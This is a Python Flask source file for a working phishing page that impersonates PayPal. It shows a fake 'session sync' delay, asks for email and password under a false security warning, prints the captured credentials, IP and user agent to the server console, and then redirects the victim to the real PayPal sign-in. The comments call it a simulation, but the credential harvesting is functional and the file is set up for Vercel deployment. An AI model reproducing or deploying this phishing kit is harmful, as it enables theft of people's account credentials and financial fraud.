from flask import Flask, render_template_string, request, redirect
import datetime

app = Flask(__name__)

# --- THE UI (Simulating a High-Security Session Refresh) ---
HTML_CONTENT = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal | Security Update</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
        h2 { color: #2c2e2d; margin-bottom: 10px; }
        p { color: #6c7378; font-size: 14px; margin-bottom: 20px; }
        .warning-box { background: #fff3cd; border: 1px solid #ffeeba; color: #856404; padding: 15px; border-radius: 4px; font-size: 13px; margin-bottom: 20px; text-align: left; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #0070ba; color: white; border: none; border-radius: 25px; cursor: pointer; font-weight: bold; margin-top: 15px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0070ba; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #form-container { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://www.paypalobjects.com/webstatic/m/v/c/logo-typesmallest.png" width="100" alt="PayPal">
        <div id="loading-state">
            <h2 style="margin-top:20px;">Syncing Session...</h2>
            <p>We detected a connection anomaly. Re-syncing your secure session.</p>
            <div class="loader"></div>
        </div>

        <div id="form-container">
            <h2 style="color: #d93025;">Security Required</h2>
            <div class="warning-box">
                <strong>Action Required:</strong> To prevent unauthorized access, please confirm your identity by re-entering your credentials to refresh your session token.
            </div>
            <form action="/api/index" method="POST">
                <input type="email" name="email" placeholder="Email or Mobile" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Refresh Session</button>
            </form>
        </div>
    </div>

    <script>
        // Simulates the "Syncing" delay to make the bypass look real
        setTimeout(() => {
            document.getElementById('loading-state').style.display = 'none';
            document.getElementById('form-container').style.display = 'block';
        }, 3000);
    </script>
</body>
</html>
"""

# --- THE BACKEND (Python Logic) ---

@app.route('/')
@app.route('/api/index', methods=['GET', 'POST'])
def index():
    # 1. Handle the GET request (Loading the page)
    if request.method == 'GET':
        return render_template_string(HTML_CONTENT)
    
    # 2. Handle the POST request (The "Bypass" Capture)
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        
        # Simulating the theft of a Session Cookie / Token
        # In a real MitM attack, the attacker grabs the actual 'Cookie' header
        stolen_session_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...[SIMULATED_TOKEN]"
        user_agent = request.headers.get('User-Agent')
        ip = request.remote_addr
        time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # LOGGING TO VERCEL CONSOLE
        print("\n" + "!"*30)
        print(f"[*] CRITICAL: SESSION HIJACK DETECTED")
        print(f"[*] TIME: {time}")
        print(f"[*] IP: {ip}")
        print(f"[*] TARGET EMAIL: {email}")
        print(f"[*] PASSWORD: {password}")
        print(f"[*] STOLEN SESSION TOKEN: {stolen_session_token}")
        print(f"[*] USER AGENT: {user_agent}")
        print("!"*30 + "\n")

        # Redirect to the real PayPal to finish the simulation
        return redirect("https://www.paypal.com/signin")

    return "Method Not Allowed", 405

# Required for Vercel deployment
app = app